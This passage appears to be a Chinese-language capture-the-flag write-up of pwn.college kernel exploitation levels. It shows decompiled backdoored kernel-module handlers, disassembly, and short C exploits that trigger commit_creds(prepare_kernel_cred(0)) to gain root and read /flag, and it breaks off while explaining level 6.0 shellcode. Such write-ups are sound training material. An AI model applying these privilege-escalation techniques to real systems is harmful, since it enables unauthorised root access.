<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/pwncollege&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">char</span> key[] = <span class="string">&quot;qasdyasejvzixjid&quot;</span>;</span><br><span class="line">  write(fd, key, <span class="keyword">sizeof</span>(key));</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="level2-1"><a href="#level2-1" class="headerlink" title="level2.1"></a>level2.1</h1><p>和2.0不能说一模一样，只能说没有区别</p>
<h1 id="level3-0"><a href="#level3-0" class="headerlink" title="level3.0"></a>level3.0</h1><h2 id="device-write-2"><a href="#device-write-2" class="headerlink" title="device_write"></a>device_write</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">device_write</span><span class="params">(file *file, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> v7; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">char</span> password[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_BC0);</span><br><span class="line">  v5 = <span class="number">16L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( length &lt;= <span class="number">0x10</span> )</span><br><span class="line">    v5 = length;</span><br><span class="line">  v6 = copy_from_user(password, buffer, v5);</span><br><span class="line">  v7 = <span class="number">17L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( v6 &lt;= <span class="number">0x11</span> )</span><br><span class="line">    v7 = v6;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(password, <span class="string">&quot;zovkowmyrqgzmumw&quot;</span>, v7) )</span><br><span class="line">    win();</span><br><span class="line">  <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="win"><a href="#win" class="headerlink" title="win"></a>win</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_B80);</span><br><span class="line">  v0 = prepare_kernel_cred(<span class="number">0L</span>L);</span><br><span class="line">  commit_creds(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>给了个后门win<br>调用write进入win，执行<code>commit_creds(prepare_kernel_cred(0LL))</code>，即获得root权限<br>然后再打开flag，读到用户态输出即可</p>
<h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/pwncollege&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">char</span> key[] = <span class="string">&quot;zovkowmyrqgzmumw&quot;</span>;</span><br><span class="line">  write(fd, key, <span class="keyword">sizeof</span>(key));</span><br><span class="line">  <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/flag&quot;</span>, O_RDWR);</span><br><span class="line">  read(fd2, buffer, <span class="number">100</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="level3-1"><a href="#level3-1" class="headerlink" title="level3.1"></a>level3.1</h1><p>与level3.0基本没差</p>
<h1 id="level4-0"><a href="#level4-0" class="headerlink" title="level4.0"></a>level4.0</h1><h2 id="device-ioctl"><a href="#device-ioctl" class="headerlink" title="device_ioctl"></a>device_ioctl</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">device_ioctl</span><span class="params">(file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">char</span> password[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_890);</span><br><span class="line">  result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">1337</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = copy_from_user(password, arg, <span class="number">16L</span>L);</span><br><span class="line">    v6 = <span class="number">17L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">0x11</span> )</span><br><span class="line">      v6 = v5;</span><br><span class="line">    v7 = <span class="built_in">strncmp</span>(password, <span class="string">&quot;gmafokhfvipyzkpw&quot;</span>, v6);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( !v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      win();</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样win函数能够提升权限至root</p>
<h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/pwncollege&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">char</span> key[] = <span class="string">&quot;xiftkfvmcuytkbfl&quot;</span>;</span><br><span class="line">  ioctl(fd, <span class="number">1337</span>, key);</span><br><span class="line">  <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/flag&quot;</span>, O_RDWR);</span><br><span class="line">  read(fd2, buffer, <span class="number">100</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="level4-1"><a href="#level4-1" class="headerlink" title="level4.1"></a>level4.1</h1><p>没差</p>
<h1 id="level5-0"><a href="#level5-0" class="headerlink" title="level5.0"></a>level5.0</h1><h2 id="device-ioctl-1"><a href="#device-ioctl-1" class="headerlink" title="device_ioctl"></a>device_ioctl</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">device_ioctl</span><span class="params">(file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_B98);</span><br><span class="line">  result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">1337</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _x86_indirect_thunk_rbx(&amp;unk_B98, file);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>仍然有后门，ioctl中操作码1337调用函数<code>_x86_indirect_thunk_rbx</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DECL_INDIRECT_THUNK(reg) \</span></span><br><span class="line">	<span class="keyword">extern</span> asmlinkage <span class="keyword">void</span> __x86_indirect_thunk_ #<span class="meta"># reg (void);</span></span><br><span class="line">SYM_FUNC_START(__x86_indirect_thunk_\reg)</span><br><span class="line">	JMP_NOSPEC \reg</span><br><span class="line">SYM_FUNC_END(__x86_indirect_thunk_\reg</span><br></pre></td></tr></table></figure>
<p>相当于</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __x86_indirect_thunk_rbx (<span class="keyword">void</span>) &#123;</span><br><span class="line">	__asm__(<span class="string">&quot;jmp rbx&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>gdb反汇编如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(gdb) file &#x2F;opt&#x2F;linux&#x2F;vmlinux </span><br><span class="line">Load new symbol table from &quot;&#x2F;opt&#x2F;linux&#x2F;vmlinux&quot;? (y or n) y</span><br><span class="line">Reading symbols from &#x2F;opt&#x2F;linux&#x2F;vmlinux...</span><br><span class="line">(gdb) disa</span><br><span class="line">disable      disassemble  </span><br><span class="line">(gdb) disassemble __x86_indirect_thunk_rbx</span><br><span class="line">Dump of assembler code for function __x86_indirect_thunk_rbx:</span><br><span class="line">   0xffffffff81e00ef0 &lt;+0&gt;:     jmp    *%rbx</span><br><span class="line">   0xffffffff81e00ef2 &lt;+2&gt;:     nop</span><br><span class="line">   0xffffffff81e00ef3 &lt;+3&gt;:     nop</span><br><span class="line">   0xffffffff81e00ef4 &lt;+4&gt;:     nop</span><br><span class="line">   0xffffffff81e00ef5 &lt;+5&gt;:     nop</span><br><span class="line">   0xffffffff81e00ef6 &lt;+6&gt;:     nop</span><br><span class="line">   0xffffffff81e00ef7 &lt;+7&gt;:     nop</span><br><span class="line">   0xffffffff81e00ef8 &lt;+8&gt;:     nop</span><br><span class="line">   0xffffffff81e00ef9 &lt;+9&gt;:     nop</span><br><span class="line">   0xffffffff81e00efa &lt;+10&gt;:    nop</span><br><span class="line">   0xffffffff81e00efb &lt;+11&gt;:    nop</span><br><span class="line">   0xffffffff81e00efc &lt;+12&gt;:    nop</span><br><span class="line">   0xffffffff81e00efd &lt;+13&gt;:    nop</span><br><span class="line">   0xffffffff81e00efe &lt;+14&gt;:    nop</span><br><span class="line">   0xffffffff81e00eff &lt;+15&gt;:    nop</span><br><span class="line">   0xffffffff81e00f00 &lt;+16&gt;:    nop</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>即可以看成<code>jmp rbx</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text.unlikely:0000000000000AFC ; __int64 __fastcall device_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)</span><br><span class="line">.text.unlikely:0000000000000AFC device_ioctl    proc near               ; DATA XREF: .data:fops↓o</span><br><span class="line">.text.unlikely:0000000000000AFC file &#x3D; rdi                              ; file *</span><br><span class="line">.text.unlikely:0000000000000AFC cmd &#x3D; rsi                               ; unsigned int</span><br><span class="line">.text.unlikely:0000000000000AFC arg &#x3D; rdx                               ; unsigned __int64</span><br><span class="line">.text.unlikely:0000000000000AFC                 push    rbp</span><br><span class="line">.text.unlikely:0000000000000AFD                 mov     rcx, arg</span><br><span class="line">.text.unlikely:0000000000000B00                 mov     ebp, esi</span><br><span class="line">.text.unlikely:0000000000000B02 cmd &#x3D; rbp                               ; unsigned int</span><br><span class="line">.text.unlikely:0000000000000B02                 push    rbx</span><br><span class="line">.text.unlikely:0000000000000B03                 mov     rbx, arg</span><br><span class="line">.text.unlikely:0000000000000B06 arg &#x3D; rbx                               ; unsigned __int64</span><br><span class="line">.text.unlikely:0000000000000B06                 mov     edx, esi</span><br><span class="line">.text.unlikely:0000000000000B08                 mov     rsi, file</span><br><span class="line">.text.unlikely:0000000000000B0B                 mov     file, offset unk_B98</span><br><span class="line">.text.unlikely:0000000000000B12                 call    printk          ; PIC mode</span><br><span class="line">.text.unlikely:0000000000000B17                 or      rax, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text.unlikely:0000000000000B1B                 cmp     ebp, 539h</span><br><span class="line">.text.unlikely:0000000000000B21                 jnz     short loc_B2A</span><br><span class="line">.text.unlikely:0000000000000B23                 call    __x86_indirect_thunk_rbx ; PIC mode</span><br><span class="line">.text.unlikely:0000000000000B28                 xor     eax, eax</span><br><span class="line">.text.unlikely:0000000000000B2A</span><br><span class="line">.text.unlikely:0000000000000B2A loc_B2A:                                ; CODE XREF: device_ioctl+25↑j</span><br><span class="line">.text.unlikely:0000000000000B2A                 pop     arg</span><br><span class="line">.text.unlikely:0000000000000B2B                 pop     cmd</span><br><span class="line">.text.unlikely:0000000000000B2C                 retn</span><br><span class="line">.text.unlikely:0000000000000B2C device_ioctl    endp</span><br></pre></td></tr></table></figure>

<p>汇编中可以看到rbx即参数arg</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>本题没有开kaslr，进入practice（调试）模式进虚拟机后sudo进入root，执行<br><code>root@vm_practice_babykernel_level5:~# cat /proc/kallsyms | grep win</code></p>
<p>看到函数地址<code>ffffffffc0000b2d t win  [challenge]</code></p>
<p>所以可以布置第三个参数为win函数地址，即可跳转进入后门，接下来打开flag传到用户态再打印即可</p>
<h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/pwncollege&quot;</span>, O_RDWR);</span><br><span class="line">  ioctl(fd, <span class="number">1337</span>, <span class="number">0xffffffffc0000b2d</span>);</span><br><span class="line">  <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/flag&quot;</span>, O_RDWR);</span><br><span class="line">  read(fd2, buffer, <span class="number">100</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="level5-1"><a href="#level5-1" class="headerlink" title="level5.1"></a>level5.1</h1><p>没差</p>
<h1 id="level6-0"><a href="#level6-0" class="headerlink" title="level6.0"></a>level6.0</h1><h2 id="device-write-3"><a href="#device-write-3" class="headerlink" title="device_write"></a>device_write</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">device_write</span><span class="params">(file *file, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_708, file, buffer);</span><br><span class="line">  v5 = <span class="number">4096L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( length &lt;= <span class="number">0x1000</span> )</span><br><span class="line">    v5 = length;</span><br><span class="line">  v6 = copy_from_user(shellcode, buffer, v5);</span><br><span class="line">  _x86_indirect_thunk_rax();</span><br><span class="line">  <span class="keyword">return</span> length - v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>_x86_indirect_thunk_rax</code>和前文提到的<code>_x86_indirect_thunk_rbx</code>类似，这里即<code>jmp rax</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble __x86_indirect_thunk_rax</span><br><span class="line">Dump of assembler code for function __x86_indirect_thunk_rax:</span><br><span class="line">   0xffffffff81e00ed0 &lt;+0&gt;:     jmp    *%rax</span><br><span class="line">   0xffffffff81e00ed2 &lt;+2&gt;:     nop</span><br><span class="line">   0xffffffff81e00ed3 &lt;+3&gt;:     nop</span><br><span class="line">   0xffffffff81e00ed4 &lt;+4&gt;:     nop</span><br><span class="line">   0xffffffff81e00ed5 &lt;+5&gt;:     nop</span><br><span class="line">   0xffffffff81e00ed6 &lt;+6&gt;:     nop</span><br><span class="line">   0xffffffff81e00ed7 &lt;+7&gt;:     nop</span><br><span class="line">   0xffffffff81e00ed8 &lt;+8&gt;:     nop</span><br><span class="line">   0xffffffff81e00ed9 &lt;+9&gt;:     nop</span><br><span class="line">   0xffffffff81e00eda &lt;+10&gt;:    nop</span><br><span class="line">   0xffffffff81e00edb &lt;+11&gt;:    nop</span><br><span class="line">   0xffffffff81e00edc &lt;+12&gt;:    nop</span><br><span class="line">   0xffffffff81e00edd &lt;+13&gt;:    nop</span><br><span class="line">   0xffffffff81e00ede &lt;+14&gt;:    nop</span><br><span class="line">   0xffffffff81e00edf &lt;+15&gt;:    nop</span><br><span class="line">   0xffffffff81e00ee0 &lt;+16&gt;:    nop</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p><code>device_write</code>汇编如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">.text.unlikely:000000000000065C ; ssize_t __fastcall device_write(file *file, const char *buffer, size_t length, loff_t *offset)</span><br><span class="line">.text.unlikely:000000000000065C device_write    proc near               ; DATA XREF: .data:fops↓o</span><br><span class="line">.text.unlikely:000000000000065C file &#x3D; rdi                              ; file *</span><br><span class="line">.text.unlikely:000000000000065C buffer &#x3D; rsi                            ; const char *</span><br><span class="line">.text.unlikely:000000000000065C length &#x3D; rdx                            ; size_t</span><br><span class="line">.text.unlikely:000000000000065C offset &#x3D; rcx                            ; loff_t *</span><br><span class="line">.text.unlikely:000000000000065C                 push    rbp</span><br><span class="line">.text.unlikely:000000000000065D                 mov     r8, offset</span><br><span class="line">.text.unlikely:0000000000000660                 mov     rbp, buffer</span><br><span class="line">.text.unlikely:0000000000000663 buffer &#x3D; rbp                            ; const char *</span><br><span class="line">.text.unlikely:0000000000000663                 mov     offset, length</span><br><span class="line">.text.unlikely:0000000000000666                 push    rbx</span><br><span class="line">.text.unlikely:0000000000000667                 mov     rbx, length</span><br><span class="line">.text.unlikely:000000000000066A length &#x3D; rbx                            ; size_t</span><br><span class="line">.text.unlikely:000000000000066A                 mov     rdx, rsi</span><br><span class="line">.text.unlikely:000000000000066D                 mov     rsi, file</span><br><span class="line">.text.unlikely:0000000000000670                 mov     file, offset unk_708</span><br><span class="line">.text.unlikely:0000000000000677                 call    printk          ; PIC mode</span><br><span class="line">.text.unlikely:000000000000067C                 cmp     length, 1000h</span><br><span class="line">.text.unlikely:0000000000000683                 mov     edx, 1000h</span><br><span class="line">.text.unlikely:0000000000000688                 mov     rsi, buffer</span><br><span class="line">.text.unlikely:000000000000068B                 cmovbe  rdx, length</span><br><span class="line">.text.unlikely:000000000000068F                 mov     rdi, cs:shellcode</span><br><span class="line">.text.unlikely:0000000000000696                 call    _copy_from_user ; PIC mode</span><br><span class="line">.text.unlikely:000000000000069B                 mov     buffer, rax</span><br><span class="line">.text.unlikely:000000000000069E                 mov     rax, cs:shellcode</span><br><span class="line">.text.unlikely:00000000000006A5                 call    __x86_indirect_thunk_rax ; PIC mode</span><br><span class="line">.text.unlikely:00000000000006AA                 mov     rax, length</span><br><span class="line">.text.unlikely:00000000000006AD                 pop     length</span><br><span class="line">.text.unlikely:00000000000006AE length &#x3D; rax                            ; size_t</span><br><span class="line">.text.unlikely:00000000000006AE                 sub     length, rbp</span><br><span class="line">.text.unlikely:00000000000006B1                 pop     rbp</span><br><span class="line">.text.unlikely:00000000000006B2                 retn</span><br><span class="line">.text.unlikely:00000000000006B2 device_write    endp</span><br></pre></td></tr></table></figure>

<p>函数会将用户态buffer的内容传入内核态的shellcode变量中<br><code>jmp rax</code>前，rax指向shellcode<br>所以需要一段能够提权的shellcode</p>
<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>内核中有一个<code>cred</code>结构体描述进程的权限</p>
